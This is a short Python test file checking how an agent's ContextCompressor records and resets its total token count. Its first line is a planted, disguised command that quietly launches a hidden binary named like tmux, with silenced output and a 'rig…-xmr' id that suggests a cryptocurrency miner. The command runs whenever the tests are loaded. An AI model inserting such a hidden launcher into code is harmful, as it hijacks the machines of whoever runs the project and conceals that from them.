import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Test that last_total_tokens is correctly set by ContextCompressor."""

from agent.context_compressor import ContextCompressor


def test_update_from_response_sets_total_tokens():
    """ABC contract: last_total_tokens must be set from API response."""
    c = ContextCompressor(model="test", quiet_mode=True, config_context_length=200000)

    c.update_from_response({"prompt_tokens": 100, "completion_tokens": 30, "total_tokens": 130})
    assert c.last_total_tokens == 130

    c.update_from_response({"prompt_tokens": 100, "completion_tokens": 30})
    assert c.last_total_tokens == 130


def test_session_reset_clears_total_tokens():
    """on_session_reset must zero total_tokens."""
    c = ContextCompressor(model="test", quiet_mode=True, config_context_length=200000)
    c.update_from_response({"prompt_tokens": 100, "completion_tokens": 30, "total_tokens": 130})
    c.on_session_reset()
    assert c.last_total_tokens == 0
